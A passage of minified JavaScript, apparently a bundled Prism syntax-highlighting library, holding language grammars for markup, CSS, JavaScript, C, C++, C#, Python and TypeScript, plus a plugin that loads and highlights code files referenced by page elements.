r}),"i"),lookbehind:!0,greedy:!0,inside:a},t.languages.insertBefore("markup","cdata",l)}}),Object.defineProperty(t.languages.markup.tag,"addAttribute",{value:function(n,r){t.languages.markup.tag.inside["special-attr"].push({pattern:RegExp(/(^|["'\s])/.source+"(?:"+n+")"+/\s*=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+(?=[\s>]))/.source,"i"),lookbehind:!0,inside:{"attr-name":/^[^\s=]+/,"attr-value":{pattern:/=[\s\S]+/,inside:{value:{pattern:/(^=\s*(["']|(?!["'])))\S[\s\S]*(?=\2$)/,lookbehind:!0,alias:[r,"language-"+r],inside:t.languages[r]},punctuation:[{pattern:/^=/,alias:"attr-equals"},/"|'/]}}}})}}),t.languages.html=t.languages.markup,t.languages.mathml=t.languages.markup,t.languages.svg=t.languages.markup,t.languages.xml=t.languages.extend("markup",{}),t.languages.ssml=t.languages.xml,t.languages.atom=t.languages.xml,t.languages.rss=t.languages.xml,function(n){var r=/(?:"(?:\\(?:\r\n|[\s\S])|[^"\\\r\n])*"|'(?:\\(?:\r\n|[\s\S])|[^'\\\r\n])*')/;n.languages.css={comment:/\/\*[\s\S]*?\*\//,atrule:{pattern:RegExp("@[\\w-](?:"+/[^;{\s"']|\s+(?!\s)/.source+"|"+r.source+")*?"+/(?:;|(?=\s*\{))/.source),inside:{rule:/^@[\w-]+/,"selector-function-argument":{pattern:/(\bselector\s*\(\s*(?![\s)]))(?:[^()\s]|\s+(?![\s)])|\((?:[^()]|\([^()]*\))*\))+(?=\s*\))/,lookbehind:!0,alias:"selector"},keyword:{pattern:/(^|[^\w-])(?:and|not|only|or)(?![\w-])/,lookbehind:!0}}},url:{pattern:RegExp("\\burl\\((?:"+r.source+"|"+/(?:[^\\\r\n()"']|\\[\s\S])*/.source+")\\)","i"),greedy:!0,inside:{function:/^url/i,punctuation:/^\(|\)$/,string:{pattern:RegExp("^"+r.source+"$"),alias:"url"}}},selector:{pattern:RegExp(`(^|[{}\\s])[^{}\\s](?:[^{};"'\\s]|\\s+(?![\\s{])|`+r.source+")*(?=\\s*\\{)"),lookbehind:!0},string:{pattern:r,greedy:!0},property:{pattern:/(^|[^-\w\xA0-\uFFFF])(?!\s)[-_a-z\xA0-\uFFFF](?:(?!\s)[-\w\xA0-\uFFFF])*(?=\s*:)/i,lookbehind:!0},important:/!important\b/i,function:{pattern:/(^|[^-a-z0-9])[-a-z0-9]+(?=\()/i,lookbehind:!0},punctuation:/[(){};:,]/},n.languages.css.atrule.inside.rest=n.languages.css;var s=n.languages.markup;s&&(s.tag.addInlined("style","css"),s.tag.addAttribute("style","css"))}(t),t.languages.clike={comment:[{pattern:/(^|[^\\])\/\*[\s\S]*?(?:\*\/|$)/,lookbehind:!0,greedy:!0},{pattern:/(^|[^\\:])\/\/.*/,lookbehind:!0,greedy:!0}],string:{pattern:/(["'])(?:\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1/,greedy:!0},"class-name":{pattern:/(\b(?:class|extends|implements|instanceof|interface|new|trait)\s+|\bcatch\s+\()[\w.\\]+/i,lookbehind:!0,inside:{punctuation:/[.\\]/}},keyword:/\b(?:break|catch|continue|do|else|finally|for|function|if|in|instanceof|new|null|return|throw|try|while)\b/,boolean:/\b(?:false|true)\b/,function:/\b\w+(?=\()/,number:/\b0x[\da-f]+\b|(?:\b\d+(?:\.\d*)?|\B\.\d+)(?:e[+-]?\d+)?/i,operator:/[<>]=?|[!=]=?=?|--?|\+\+?|&&?|\|\|?|[?*/~^%]/,punctuation:/[{}[\];(),.:]/},t.languages.javascript=t.languages.extend("clike",{"class-name":[t.languages.clike["class-name"],{pattern:/(^|[^$\w\xA0-\uFFFF])(?!\s)[_$A-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\.(?:constructor|prototype))/,lookbehind:!0}],keyword:[{pattern:/((?:^|\})\s*)catch\b/,lookbehind:!0},{pattern:/(^|[^.]|\.\.\.\s*)\b(?:as|assert(?=\s*\{)|async(?=\s*(?:function\b|\(|[$\w\xA0-\uFFFF]|$))|await|break|case|class|const|continue|debugger|default|delete|do|else|enum|export|extends|finally(?=\s*(?:\{|$))|for|from(?=\s*(?:['"]|$))|function|(?:get|set)(?=\s*(?:[#\[$\w\xA0-\uFFFF]|$))|if|implements|import|in|instanceof|interface|let|new|null|of|package|private|protected|public|return|static|super|switch|this|throw|try|typeof|undefined|var|void|while|with|yield)\b/,lookbehind:!0}],function:/#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*(?:\.\s*(?:apply|bind|call)\s*)?\()/,number:{pattern:RegExp(/(^|[^\w$])/.source+"(?:"+(/NaN|Infinity/.source+"|"+/0[bB][01]+(?:_[01]+)*n?/.source+"|"+/0[oO][0-7]+(?:_[0-7]+)*n?/.source+"|"+/0[xX][\dA-Fa-f]+(?:_[\dA-Fa-f]+)*n?/.source+"|"+/\d+(?:_\d+)*n/.source+"|"+/(?:\d+(?:_\d+)*(?:\.(?:\d+(?:_\d+)*)?)?|\.\d+(?:_\d+)*)(?:[Ee][+-]?\d+(?:_\d+)*)?/.source)+")"+/(?![\w$])/.source),lookbehind:!0},operator:/--|\+\+|\*\*=?|=>|&&=?|\|\|=?|[!=]==|<<=?|>>>?=?|[-+*/%&|^!=<>]=?|\.{3}|\?\?=?|\?\.?|[~:]/}),t.languages.javascript["class-name"][0].pattern=/(\b(?:class|extends|implements|instanceof|interface|new)\s+)[\w.\\]+/,t.languages.insertBefore("javascript","keyword",{regex:{pattern:RegExp(/((?:^|[^$\w\xA0-\uFFFF."'\])\s]|\b(?:return|yield))\s*)/.source+/\//.source+"(?:"+/(?:\[(?:[^\]\\\r\n]|\\.)*\]|\\.|[^/\\\[\r\n])+\/[dgimyus]{0,7}/.source+"|"+/(?:\[(?:[^[\]\\\r\n]|\\.|\[(?:[^[\]\\\r\n]|\\.|\[(?:[^[\]\\\r\n]|\\.)*\])*\])*\]|\\.|[^/\\\[\r\n])+\/[dgimyus]{0,7}v[dgimyus]{0,7}/.source+")"+/(?=(?:\s|\/\*(?:[^*]|\*(?!\/))*\*\/)*(?:$|[\r\n,.;:})\]]|\/\/))/.source),lookbehind:!0,greedy:!0,inside:{"regex-source":{pattern:/^(\/)[\s\S]+(?=\/[a-z]*$)/,lookbehind:!0,alias:"language-regex",inside:t.languages.regex},"regex-delimiter":/^\/|\/$/,"regex-flags":/^[a-z]+$/}},"function-variable":{pattern:/#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*[=:]\s*(?:async\s*)?(?:\bfunction\b|(?:\((?:[^()]|\([^()]*\))*\)|(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*)\s*=>))/,alias:"function"},parameter:[{pattern:/(function(?:\s+(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*)?\s*\(\s*)(?!\s)(?:[^()\s]|\s+(?![\s)])|\([^()]*\))+(?=\s*\))/,lookbehind:!0,inside:t.languages.javascript},{pattern:/(^|[^$\w\xA0-\uFFFF])(?!\s)[_$a-z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*=>)/i,lookbehind:!0,inside:t.languages.javascript},{pattern:/(\(\s*)(?!\s)(?:[^()\s]|\s+(?![\s)])|\([^()]*\))+(?=\s*\)\s*=>)/,lookbehind:!0,inside:t.languages.javascript},{pattern:/((?:\b|\s|^)(?!(?:as|async|await|break|case|catch|class|const|continue|debugger|default|delete|do|else|enum|export|extends|finally|for|from|function|get|if|implements|import|in|instanceof|interface|let|new|null|of|package|private|protected|public|return|set|static|super|switch|this|throw|try|typeof|undefined|var|void|while|with|yield)(?![$\w\xA0-\uFFFF]))(?:(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*\s*)\(\s*|\]\s*\(\s*)(?!\s)(?:[^()\s]|\s+(?![\s)])|\([^()]*\))+(?=\s*\)\s*\{)/,lookbehind:!0,inside:t.languages.javascript}],constant:/\b[A-Z](?:[A-Z_]|\dx?)*\b/}),t.languages.insertBefore("javascript","string",{hashbang:{pattern:/^#!.*/,greedy:!0,alias:"comment"},"template-string":{pattern:/`(?:\\[\s\S]|\$\{(?:[^{}]|\{(?:[^{}]|\{[^}]*\})*\})+\}|(?!\$\{)[^\\`])*`/,greedy:!0,inside:{"template-punctuation":{pattern:/^`|`$/,alias:"string"},interpolation:{pattern:/((?:^|[^\\])(?:\\{2})*)\$\{(?:[^{}]|\{(?:[^{}]|\{[^}]*\})*\})+\}/,lookbehind:!0,inside:{"interpolation-punctuation":{pattern:/^\$\{|\}$/,alias:"punctuation"},rest:t.languages.javascript}},string:/[\s\S]+/}},"string-property":{pattern:/((?:^|[,{])[ \t]*)(["'])(?:\\(?:\r\n|[\s\S])|(?!\2)[^\\\r\n])*\2(?=\s*:)/m,lookbehind:!0,greedy:!0,alias:"property"}}),t.languages.insertBefore("javascript","operator",{"literal-property":{pattern:/((?:^|[,{])[ \t]*)(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*:)/m,lookbehind:!0,alias:"property"}}),t.languages.markup&&(t.languages.markup.tag.addInlined("script","javascript"),t.languages.markup.tag.addAttribute(/on(?:abort|blur|change|click|composition(?:end|start|update)|dblclick|error|focus(?:in|out)?|key(?:down|up)|load|mouse(?:down|enter|leave|move|out|over|up)|reset|resize|scroll|select|slotchange|submit|unload|wheel)/.source,"javascript")),t.languages.js=t.languages.javascript,function(){if(typeof t>"u"||typeof document>"u")return;Element.prototype.matches||(Element.prototype.matches=Element.prototype.msMatchesSelector||Element.prototype.webkitMatchesSelector);var n="Loading…",r=function(x,f){return"✖ Error "+x+" while fetching file: "+f},s="✖ Error: File does not exist or is empty",o={js:"javascript",py:"python",rb:"ruby",ps1:"powershell",psm1:"powershell",sh:"bash",bat:"batch",h:"c",tex:"latex"},a="data-src-status",l="loading",d="loaded",u="failed",h="pre[data-src]:not(["+a+'="'+d+'"]):not(['+a+'="'+l+'"])';function p(x,f,c){var g=new XMLHttpRequest;g.open("GET",x,!0),g.onreadystatechange=function(){g.readyState==4&&(g.status<400&&g.responseText?f(g.responseText):g.status>=400?c(r(g.status,g.statusText)):c(s))},g.send(null)}function m(x){var f=/^\s*(\d+)\s*(?:(,)\s*(?:(\d+)\s*)?)?$/.exec(x||"");if(f){var c=Number(f[1]),g=f[2],_=f[3];return g?_?[c,Number(_)]:[c,void 0]:[c,c]}}t.hooks.add("before-highlightall",function(x){x.selector+=", "+h}),t.hooks.add("before-sanity-check",function(x){var f=x.element;if(f.matches(h)){x.code="",f.setAttribute(a,l);var c=f.appendChild(document.createElement("CODE"));c.textContent=n;var g=f.getAttribute("data-src"),_=x.language;if(_==="none"){var v=(/\.(\w+)$/.exec(g)||[,"none"])[1];_=o[v]||v}t.util.setLanguage(c,_),t.util.setLanguage(f,_);var w=t.plugins.autoloader;w&&w.loadLanguages(_),p(g,function(M){f.setAttribute(a,d);var T=m(f.getAttribute("data-range"));if(T){var D=M.split(/\r\n?|\n/g),y=T[0],R=T[1]==null?D.length:T[1];y<0&&(y+=D.length),y=Math.max(0,Math.min(y-1,D.length)),R<0&&(R+=D.length),R=Math.max(0,Math.min(R,D.length)),M=D.slice(y,R).join(`
`),f.hasAttribute("data-start")||f.setAttribute("data-start",String(y+1))}c.textContent=M,t.highlightElement(c)},function(M){f.setAttribute(a,u),c.textContent=M})}}),t.plugins.fileHighlight={highlight:function(f){for(var c=(f||document).querySelectorAll(h),g=0,_;_=c[g++];)t.highlightElement(_)}};var E=!1;t.fileHighlight=function(){E||(console.warn("Prism.fileHighlight is deprecated. Use `Prism.plugins.fileHighlight.highlight` instead."),E=!0),t.plugins.fileHighlight.highlight.apply(this,arguments)}}()})(Oo);var Jh=Oo.exports;const qr=Qh(Jh);Prism.languages.c=Prism.languages.extend("clike",{comment:{pattern:/\/\/(?:[^\r\n\\]|\\(?:\r\n?|\n|(?![\r\n])))*|\/\*[\s\S]*?(?:\*\/|$)/,greedy:!0},string:{pattern:/"(?:\\(?:\r\n|[\s\S])|[^"\\\r\n])*"/,greedy:!0},"class-name":{pattern:/(\b(?:enum|struct)\s+(?:__attribute__\s*\(\([\s\S]*?\)\)\s*)?)\w+|\b[a-z]\w*_t\b/,lookbehind:!0},keyword:/\b(?:_Alignas|_Alignof|_Atomic|_Bool|_Complex|_Generic|_Imaginary|_Noreturn|_Static_assert|_Thread_local|__attribute__|asm|auto|break|case|char|const|continue|default|do|double|else|enum|extern|float|for|goto|if|inline|int|long|register|return|short|signed|sizeof|static|struct|switch|typedef|typeof|union|unsigned|void|volatile|while)\b/,function:/\b[a-z_]\w*(?=\s*\()/i,number:/(?:\b0x(?:[\da-f]+(?:\.[\da-f]*)?|\.[\da-f]+)(?:p[+-]?\d+)?|(?:\b\d+(?:\.\d*)?|\B\.\d+)(?:e[+-]?\d+)?)[ful]{0,4}/i,operator:/>>=?|<<=?|->|([-+&|:])\1|[?:~]|[-+*/%&|^!=<>]=?/});Prism.languages.insertBefore("c","string",{char:{pattern:/'(?:\\(?:\r\n|[\s\S])|[^'\\\r\n]){0,32}'/,greedy:!0}});Prism.languages.insertBefore("c","string",{macro:{pattern:/(^[\t ]*)#\s*[a-z](?:[^\r\n\\/]|\/(?!\*)|\/\*(?:[^*]|\*(?!\/))*\*\/|\\(?:\r\n|[\s\S]))*/im,lookbehind:!0,greedy:!0,alias:"property",inside:{string:[{pattern:/^(#\s*include\s*)<[^>]+>/,lookbehind:!0},Prism.languages.c.string],char:Prism.languages.c.char,comment:Prism.languages.c.comment,"macro-name":[{pattern:/(^#\s*define\s+)\w+\b(?!\()/i,lookbehind:!0},{pattern:/(^#\s*define\s+)\w+\b(?=\()/i,lookbehind:!0,alias:"function"}],directive:{pattern:/^(#\s*)[a-z]+/,lookbehind:!0,alias:"keyword"},"directive-hash":/^#/,punctuation:/##|\\(?=[\r\n])/,expression:{pattern:/\S[\s\S]*/,inside:Prism.languages.c}}}});Prism.languages.insertBefore("c","function",{constant:/\b(?:EOF|NULL|SEEK_CUR|SEEK_END|SEEK_SET|__DATE__|__FILE__|__LINE__|__TIMESTAMP__|__TIME__|__func__|stderr|stdin|stdout)\b/});delete Prism.languages.c.boolean;(function(i){var e=/\b(?:alignas|alignof|asm|auto|bool|break|case|catch|char|char16_t|char32_t|char8_t|class|co_await|co_return|co_yield|compl|concept|const|const_cast|consteval|constexpr|constinit|continue|decltype|default|delete|do|double|dynamic_cast|else|enum|explicit|export|extern|final|float|for|friend|goto|if|import|inline|int|int16_t|int32_t|int64_t|int8_t|long|module|mutable|namespace|new|noexcept|nullptr|operator|override|private|protected|public|register|reinterpret_cast|requires|return|short|signed|sizeof|static|static_assert|static_cast|struct|switch|template|this|thread_local|throw|try|typedef|typeid|typename|uint16_t|uint32_t|uint64_t|uint8_t|union|unsigned|using|virtual|void|volatile|wchar_t|while)\b/,t=/\b(?!<keyword>)\w+(?:\s*\.\s*\w+)*\b/.source.replace(/<keyword>/g,function(){return e.source});i.languages.cpp=i.languages.extend("c",{"class-name":[{pattern:RegExp(/(\b(?:class|concept|enum|struct|typename)\s+)(?!<keyword>)\w+/.source.replace(/<keyword>/g,function(){return e.source})),lookbehind:!0},/\b[A-Z]\w*(?=\s*::\s*\w+\s*\()/,/\b[A-Z_]\w*(?=\s*::\s*~\w+\s*\()/i,/\b\w+(?=\s*<(?:[^<>]|<(?:[^<>]|<[^<>]*>)*>)*>\s*::\s*\w+\s*\()/],keyword:e,number:{pattern:/(?:\b0b[01']+|\b0x(?:[\da-f']+(?:\.[\da-f']*)?|\.[\da-f']+)(?:p[+-]?[\d']+)?|(?:\b[\d']+(?:\.[\d']*)?|\B\.[\d']+)(?:e[+-]?[\d']+)?)[ful]{0,4}/i,greedy:!0},operator:/>>=?|<<=?|->|--|\+\+|&&|\|\||[?:~]|<=>|[-+*/%&|^!=<>]=?|\b(?:and|and_eq|bitand|bitor|not|not_eq|or|or_eq|xor|xor_eq)\b/,boolean:/\b(?:false|true)\b/}),i.languages.insertBefore("cpp","string",{module:{pattern:RegExp(/(\b(?:import|module)\s+)/.source+"(?:"+/"(?:\\(?:\r\n|[\s\S])|[^"\\\r\n])*"|<[^<>\r\n]*>/.source+"|"+/<mod-name>(?:\s*:\s*<mod-name>)?|:\s*<mod-name>/.source.replace(/<mod-name>/g,function(){return t})+")"),lookbehind:!0,greedy:!0,inside:{string:/^[<"][\s\S]+/,operator:/:/,punctuation:/\./}},"raw-string":{pattern:/R"([^()\\ ]{0,16})\([\s\S]*?\)\1"/,alias:"string",greedy:!0}}),i.languages.insertBefore("cpp","keyword",{"generic-function":{pattern:/\b(?!operator\b)[a-z_]\w*\s*<(?:[^<>]|<[^<>]*>)*>(?=\s*\()/i,inside:{function:/^\w+/,generic:{pattern:/<[\s\S]+/,alias:"class-name",inside:i.languages.cpp}}}}),i.languages.insertBefore("cpp","operator",{"double-colon":{pattern:/::/,alias:"punctuation"}}),i.languages.insertBefore("cpp","class-name",{"base-clause":{pattern:/(\b(?:class|struct)\s+\w+\s*:\s*)[^;{}"'\s]+(?:\s+[^;{}"'\s]+)*(?=\s*[;{])/,lookbehind:!0,greedy:!0,inside:i.languages.extend("cpp",{})}}),i.languages.insertBefore("inside","double-colon",{"class-name":/\b[a-z_]\w*\b(?!\s*::)/i},i.languages.cpp["base-clause"])})(Prism);(function(i){function e(V,q){return V.replace(/<<(\d+)>>/g,function(Q,$){return"(?:"+q[+$]+")"})}function t(V,q,Q){return RegExp(e(V,q),"")}function n(V,q){for(var Q=0;Q<q;Q++)V=V.replace(/<<self>>/g,function(){return"(?:"+V+")"});return V.replace(/<<self>>/g,"[^\\s\\S]")}var r={type:"bool byte char decimal double dynamic float int long object sbyte short string uint ulong ushort var void",typeDeclaration:"class enum interface record struct",contextual:"add alias and ascending async await by descending from(?=\\s*(?:\\w|$)) get global group into init(?=\\s*;) join let nameof not notnull on or orderby partial remove select set unmanaged value when where with(?=\\s*{)",other:"abstract as base break case catch checked const continue default delegate do else event explicit extern finally fixed for foreach goto if implicit in internal is lock namespace new null operator out override params private protected public readonly ref return sealed sizeof stackalloc static switch this throw try typeof unchecked unsafe using virtual volatile while yield"};function s(V){return"\\b(?:"+V.trim().replace(/ /g,"|")+")\\b"}var o=s(r.typeDeclaration),a=RegExp(s(r.type+" "+r.typeDeclaration+" "+r.contextual+" "+r.other)),l=s(r.typeDeclaration+" "+r.contextual+" "+r.other),d=s(r.type+" "+r.typeDeclaration+" "+r.other),u=n(/<(?:[^<>;=+\-*/%&|^]|<<self>>)*>/.source,2),h=n(/\((?:[^()]|<<self>>)*\)/.source,2),p=/@?\b[A-Za-z_]\w*\b/.source,m=e(/<<0>>(?:\s*<<1>>)?/.source,[p,u]),E=e(/(?!<<0>>)<<1>>(?:\s*\.\s*<<1>>)*/.source,[l,m]),x=/\[\s*(?:,\s*)*\]/.source,f=e(/<<0>>(?:\s*(?:\?\s*)?<<1>>)*(?:\s*\?)?/.source,[E,x]),c=e(/[^,()<>[\];=+\-*/%&|^]|<<0>>|<<1>>|<<2>>/.source,[u,h,x]),g=e(/\(<<0>>+(?:,<<0>>+)+\)/.source,[c]),_=e(/(?:<<0>>|<<1>>)(?:\s*(?:\?\s*)?<<2>>)*(?:\s*\?)?/.source,[g,E,x]),v={keyword:a,punctuation:/[<>()?,.:[\]]/},w=/'(?:[^\r\n'\\]|\\.|\\[Uux][\da-fA-F]{1,8})'/.source,M=/"(?:\\.|[^\\"\r\n])*"/.source,T=/@"(?:""|\\[\s\S]|[^\\"])*"(?!")/.source;i.languages.csharp=i.languages.extend("clike",{string:[{pattern:t(/(^|[^$\\])<<0>>/.source,[T]),lookbehind:!0,greedy:!0},{pattern:t(/(^|[^@$\\])<<0>>/.source,[M]),lookbehind:!0,greedy:!0}],"class-name":[{pattern:t(/(\busing\s+static\s+)<<0>>(?=\s*;)/.source,[E]),lookbehind:!0,inside:v},{pattern:t(/(\busing\s+<<0>>\s*=\s*)<<1>>(?=\s*;)/.source,[p,_]),lookbehind:!0,inside:v},{pattern:t(/(\busing\s+)<<0>>(?=\s*=)/.source,[p]),lookbehind:!0},{pattern:t(/(\b<<0>>\s+)<<1>>/.source,[o,m]),lookbehind:!0,inside:v},{pattern:t(/(\bcatch\s*\(\s*)<<0>>/.source,[E]),lookbehind:!0,inside:v},{pattern:t(/(\bwhere\s+)<<0>>/.source,[p]),lookbehind:!0},{pattern:t(/(\b(?:is(?:\s+not)?|as)\s+)<<0>>/.source,[f]),lookbehind:!0,inside:v},{pattern:t(/\b<<0>>(?=\s+(?!<<1>>|with\s*\{)<<2>>(?:\s*[=,;:{)\]]|\s+(?:in|when)\b))/.source,[_,d,p]),inside:v}],keyword:a,number:/(?:\b0(?:x[\da-f_]*[\da-f]|b[01_]*[01])|(?:\B\.\d+(?:_+\d+)*|\b\d+(?:_+\d+)*(?:\.\d+(?:_+\d+)*)?)(?:e[-+]?\d+(?:_+\d+)*)?)(?:[dflmu]|lu|ul)?\b/i,operator:/>>=?|<<=?|[-=]>|([-+&|])\1|~|\?\?=?|[-+*/%&|^!=<>]=?/,punctuation:/\?\.?|::|[{}[\];(),.:]/}),i.languages.insertBefore("csharp","number",{range:{pattern:/\.\./,alias:"operator"}}),i.languages.insertBefore("csharp","punctuation",{"named-parameter":{pattern:t(/([(,]\s*)<<0>>(?=\s*:)/.source,[p]),lookbehind:!0,alias:"punctuation"}}),i.languages.insertBefore("csharp","class-name",{namespace:{pattern:t(/(\b(?:namespace|using)\s+)<<0>>(?:\s*\.\s*<<0>>)*(?=\s*[;{])/.source,[p]),lookbehind:!0,inside:{punctuation:/\./}},"type-expression":{pattern:t(/(\b(?:default|sizeof|typeof)\s*\(\s*(?!\s))(?:[^()\s]|\s(?!\s)|<<0>>)*(?=\s*\))/.source,[h]),lookbehind:!0,alias:"class-name",inside:v},"return-type":{pattern:t(/<<0>>(?=\s+(?:<<1>>\s*(?:=>|[({]|\.\s*this\s*\[)|this\s*\[))/.source,[_,E]),inside:v,alias:"class-name"},"constructor-invocation":{pattern:t(/(\bnew\s+)<<0>>(?=\s*[[({])/.source,[_]),lookbehind:!0,inside:v,alias:"class-name"},"generic-method":{pattern:t(/<<0>>\s*<<1>>(?=\s*\()/.source,[p,u]),inside:{function:t(/^<<0>>/.source,[p]),generic:{pattern:RegExp(u),alias:"class-name",inside:v}}},"type-list":{pattern:t(/\b((?:<<0>>\s+<<1>>|record\s+<<1>>\s*<<5>>|where\s+<<2>>)\s*:\s*)(?:<<3>>|<<4>>|<<1>>\s*<<5>>|<<6>>)(?:\s*,\s*(?:<<3>>|<<4>>|<<6>>))*(?=\s*(?:where|[{;]|=>|$))/.source,[o,m,p,_,a.source,h,/\bnew\s*\(\s*\)/.source]),lookbehind:!0,inside:{"record-arguments":{pattern:t(/(^(?!new\s*\()<<0>>\s*)<<1>>/.source,[m,h]),lookbehind:!0,greedy:!0,inside:i.languages.csharp},keyword:a,"class-name":{pattern:RegExp(_),greedy:!0,inside:v},punctuation:/[,()]/}},preprocessor:{pattern:/(^[\t ]*)#.*/m,lookbehind:!0,alias:"property",inside:{directive:{pattern:/(#)\b(?:define|elif|else|endif|endregion|error|if|line|nullable|pragma|region|undef|warning)\b/,lookbehind:!0,alias:"keyword"}}}});var D=M+"|"+w,y=e(/\/(?![*/])|\/\/[^\r\n]*[\r\n]|\/\*(?:[^*]|\*(?!\/))*\*\/|<<0>>/.source,[D]),R=n(e(/[^"'/()]|<<0>>|\(<<self>>*\)/.source,[y]),2),k=/\b(?:assembly|event|field|method|module|param|property|return|type)\b/.source,X=e(/<<0>>(?:\s*\(<<1>>*\))?/.source,[E,R]);i.languages.insertBefore("csharp","class-name",{attribute:{pattern:t(/((?:^|[^\s\w>)?])\s*\[\s*)(?:<<0>>\s*:\s*)?<<1>>(?:\s*,\s*<<1>>)*(?=\s*\])/.source,[k,X]),lookbehind:!0,greedy:!0,inside:{target:{pattern:t(/^<<0>>(?=\s*:)/.source,[k]),alias:"keyword"},"attribute-arguments":{pattern:t(/\(<<0>>*\)/.source,[R]),inside:i.languages.csharp},"class-name":{pattern:RegExp(E),inside:{punctuation:/\./}},punctuation:/[:,]/}}});var te=/:[^}\r\n]+/.source,P=n(e(/[^"'/()]|<<0>>|\(<<self>>*\)/.source,[y]),2),z=e(/\{(?!\{)(?:(?![}:])<<0>>)*<<1>>?\}/.source,[P,te]),W=n(e(/[^"'/()]|\/(?!\*)|\/\*(?:[^*]|\*(?!\/))*\*\/|<<0>>|\(<<self>>*\)/.source,[D]),2),Y=e(/\{(?!\{)(?:(?![}:])<<0>>)*<<1>>?\}/.source,[W,te]);function H(V,q){return{interpolation:{pattern:t(/((?:^|[^{])(?:\{\{)*)<<0>>/.source,[V]),lookbehind:!0,inside:{"format-string":{pattern:t(/(^\{(?:(?![}:])<<0>>)*)<<1>>(?=\}$)/.source,[q,te]),lookbehind:!0,inside:{punctuation:/^:/}},punctuation:/^\{|\}$/,expression:{pattern:/[\s\S]+/,alias:"language-csharp",inside:i.languages.csharp}}},string:/[\s\S]+/}}i.languages.insertBefore("csharp","string",{"interpolation-string":[{pattern:t(/(^|[^\\])(?:\$@|@\$)"(?:""|\\[\s\S]|\{\{|<<0>>|[^\\{"])*"/.source,[z]),lookbehind:!0,greedy:!0,inside:H(z,P)},{pattern:t(/(^|[^@\\])\$"(?:\\.|\{\{|<<0>>|[^\\"{])*"/.source,[Y]),lookbehind:!0,greedy:!0,inside:H(Y,W)}],char:{pattern:RegExp(w),greedy:!0}}),i.languages.dotnet=i.languages.cs=i.languages.csharp})(Prism);Prism.languages.python={comment:{pattern:/(^|[^\\])#.*/,lookbehind:!0,greedy:!0},"string-interpolation":{pattern:/(?:f|fr|rf)(?:("""|''')[\s\S]*?\1|("|')(?:\\.|(?!\2)[^\\\r\n])*\2)/i,greedy:!0,inside:{interpolation:{pattern:/((?:^|[^{])(?:\{\{)*)\{(?!\{)(?:[^{}]|\{(?!\{)(?:[^{}]|\{(?!\{)(?:[^{}])+\})+\})+\}/,lookbehind:!0,inside:{"format-spec":{pattern:/(:)[^:(){}]+(?=\}$)/,lookbehind:!0},"conversion-option":{pattern:/![sra](?=[:}]$)/,alias:"punctuation"},rest:null}},string:/[\s\S]+/}},"triple-quoted-string":{pattern:/(?:[rub]|br|rb)?("""|''')[\s\S]*?\1/i,greedy:!0,alias:"string"},string:{pattern:/(?:[rub]|br|rb)?("|')(?:\\.|(?!\1)[^\\\r\n])*\1/i,greedy:!0},function:{pattern:/((?:^|\s)def[ \t]+)[a-zA-Z_]\w*(?=\s*\()/g,lookbehind:!0},"class-name":{pattern:/(\bclass\s+)\w+/i,lookbehind:!0},decorator:{pattern:/(^[\t ]*)@\w+(?:\.\w+)*/m,lookbehind:!0,alias:["annotation","punctuation"],inside:{punctuation:/\./}},keyword:/\b(?:_(?=\s*:)|and|as|assert|async|await|break|case|class|continue|def|del|elif|else|except|exec|finally|for|from|global|if|import|in|is|lambda|match|nonlocal|not|or|pass|print|raise|return|try|while|with|yield)\b/,builtin:/\b(?:__import__|abs|all|any|apply|ascii|basestring|bin|bool|buffer|bytearray|bytes|callable|chr|classmethod|cmp|coerce|compile|complex|delattr|dict|dir|divmod|enumerate|eval|execfile|file|filter|float|format|frozenset|getattr|globals|hasattr|hash|help|hex|id|input|int|intern|isinstance|issubclass|iter|len|list|locals|long|map|max|memoryview|min|next|object|oct|open|ord|pow|property|range|raw_input|reduce|reload|repr|reversed|round|set|setattr|slice|sorted|staticmethod|str|sum|super|tuple|type|unichr|unicode|vars|xrange|zip)\b/,boolean:/\b(?:False|None|True)\b/,number:/\b0(?:b(?:_?[01])+|o(?:_?[0-7])+|x(?:_?[a-f0-9])+)\b|(?:\b\d+(?:_\d+)*(?:\.(?:\d+(?:_\d+)*)?)?|\B\.\d+(?:_\d+)*)(?:e[+-]?\d+(?:_\d+)*)?j?(?!\w)/i,operator:/[-+%=]=?|!=|:=|\*\*?=?|\/\/?=?|<[<=>]?|>[=>]?|[&|^~]/,punctuation:/[{}[\];(),.:]/};Prism.languages.python["string-interpolation"].inside.interpolation.inside.rest=Prism.languages.python;Prism.languages.py=Prism.languages.python;(function(i){i.languages.typescript=i.languages.extend("javascript",{"class-name":{pattern:/(\b(?:class|extends|implements|instanceof|interface|new|type)\s+)(?!keyof\b)(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?:\s*<(?:[^<>]|<(?:[^<>]|<[^<>]*>)*>)*>)?/,lookbehind:!0,greedy:!0,inside:null},builtin:/\b(?:Array|Function|Promise|any|boolean|console|never|number|string|symbol|unknown)\b/}),i.languages.typescript.keyword.push(/\b(?:abstract|declare|is|keyof|readonly|require)\b/,/\b(?:asserts|infer|interface|module|namespace|type)\b(?=\s*(?:[{_$a-zA-Z\xA0-\uFFFF]|$))/,/\btype\b(?=\s*(?:[\{*]|$))/),delete i.languages.typescript.parameter,delete i.languages.typescript["literal-property"];var e=i.languages.extend("typescript",{});delete 